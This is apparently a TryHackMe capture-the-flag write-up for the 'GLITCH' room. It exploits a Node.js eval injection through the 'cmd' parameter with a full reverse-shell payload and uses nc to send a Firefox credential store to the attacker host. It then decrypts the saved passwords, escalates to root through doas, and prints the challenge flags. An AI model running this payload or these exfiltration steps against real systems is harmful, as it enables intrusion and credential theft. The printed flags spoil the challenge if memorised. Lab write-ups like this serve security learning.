| Category          | Details                                     |
|-------------------|---------------------------------------------|
| 📝 **Name**       | [GLITCH](https://tryhackme.com/room/glitch) |  
| 🏷 **Type**       | THM Challenge                               |
| 🖥 **OS**         | Linux                                       |
| 🎯 **Difficulty** | Easy                                        |
| 📁 **Tags**       | Node.js, Firefox, doas                      |

## Task 1: GLITCH

### What is your access token?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 10:35 +0100
Nmap scan report for 10.81.145.95
Host is up (0.050s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.04 seconds
```

#### Discover `/api/access` REST endpoint JS code
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl http://$TARGET                                     
<SNIP>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
<SNIP>
```

#### Access `/api/access` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl http://$TARGET/api/access
{"token":"dGhpc19pc19ub3RfcmVhbA=="}
```

#### Decode access token
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl -s http://$TARGET/api/access | jq -r .token | base64 -d
this_is_not_real
```

### What is the content of user.txt?

#### Enumerate `/api` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ feroxbuster --url http://$TARGET/api -w /usr/share/wordlists/dirb/big.txt                                         
<SNIP>
200      GET        1l        1w       36c http://10.81.145.95/api/access
200      GET        1l        1w      169c http://10.81.145.95/api/items
<SNIP>
```

#### Access `/api/items` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl http://$TARGET/api/items        
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

#### Check if `/api/items` supports other HTTP methods
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl -X OPTIONS http://$TARGET/api/items                    
GET,HEAD,POST
```

#### Send HTTP POST request to `/api/items`
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl -v -X POST http://$TARGET/api/items
*   Trying 10.81.145.95:80...
* Connected to 10.81.145.95 (10.81.145.95) port 80
* using HTTP/1.x
> POST /api/items HTTP/1.1
> Host: 10.81.145.95
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 400 Bad Request
< Server: nginx/1.14.0 (Ubuntu)
< Date: Tue, 03 Feb 2026 12:52:30 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 45
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"2d-TsYKyzKzllP3qwT6JGKU7rsiw1A"
< 
* Connection #0 to host 10.81.145.95 left intact
{"message":"there_is_a_glitch_in_the_matrix"} 
```
HTTP 400 might suggest that some parameter is missing.

#### Enumerate HTTP parameters for `/api/items` endpoint
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ ffuf -X POST -r -u http://$TARGET/api/items?FUZZ=id -w /usr/share/wordlists/dirb/big.txt                                         <SNIP>
cmd                     [Status: 500, Size: 1079, Words: 55, Lines: 11, Duration: 40ms]
```

#### Check response for `/api/items?cmd=id` HTTP POST request
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ curl -X POST http://$TARGET/api/items?cmd=test
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```
It seems that HTTP parameter `cmd` is passed to Node.js `eval` function.

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection using `cmd` HTTP POST parameter
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ PAYLOAD=$(cat <<EOF | jq -sRr @uri
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "$LHOST", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
EOF
) && curl -X POST "http://$TARGET/api/items?cmd=$PAYLOAD"
vulnerability_exploited /a/
``` 

#### Confirm foothold gained
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.130.56] from (UNKNOWN) [10.81.145.95] 33162
/usr/bin/script -qc /bin/bash /dev/null
user@ubuntu:/var/web$ id
uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev)
```

#### Capture user flag
```
user@ubuntu:~$ cat /home/user/user.txt
THM{i_don't_know_why}
```

### What is the content of root.txt?

#### Discover accessible Firefox profiles of user `user`
Profiles has been discovered with `linepeas`.
```
user@ubuntu:~$ ls -l /home/user/.firefox/b5w4643p.default-release/key4.db /home/user/.firefox/b5w4643p.default-release/logins.json
-rwxrwxr-x 1 user user 294912 Jan 27  2021 /home/user/.firefox/b5w4643p.default-release/key4.db
-rwxrwxr-x 1 user user    589 Jan 27  2021 /home/user/.firefox/b5w4643p.default-release/logins.json
```

#### Exfiltrate Firefox profile
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ nc -lp 80 -q 0 > firefox.tar.gz
```

```
user@ubuntu:~$ cd && tar -czf firefox.tar.gz .firefox/* && \
nc -q 0 192.168.130.56 80 < firefox.tar.gz
```

#### Use `firefox_decrypt.py` to decrypt `b5w4643p.default-release` profile
```
┌──(magicrc㉿perun)-[~/attack/THM GLITCH]
└─$ tar -zxf firefox.tar.gz && ~/Tools/firefox_decrypt/firefox_decrypt.py .firefox/b5w4643p.default-release
2026-02-03 15:18:56,498 - WARNING - profile.ini not found in .firefox/b5w4643p.default-release
2026-02-03 15:18:56,498 - WARNING - Continuing and assuming '.firefox/b5w4643p.default-release' is a profile location

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```

#### Escalate to user `v0id` by reusing password from decrypted Firefox profile
```
user@ubuntu:~$ su v0id
Password: love_the_void

v0id@ubuntu:/home/user$ id
uid=1001(v0id) gid=1001(v0id) groups=1001(v0id)
```

#### Discover full `root` privileges for user `v0id` in `doas` configuration
```
v0id@ubuntu:~$ cat /usr/local/etc/doas.conf
permit v0id as root
```

#### Escalate to `root` user by running `/bin/sh` with `doas`
```
v0id@ubuntu:~$ doas /bin/sh
doas /bin/sh
Password: love_the_void

# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
# cat /root/root.txt
THM{diamonds_break_our_aching_minds}
```
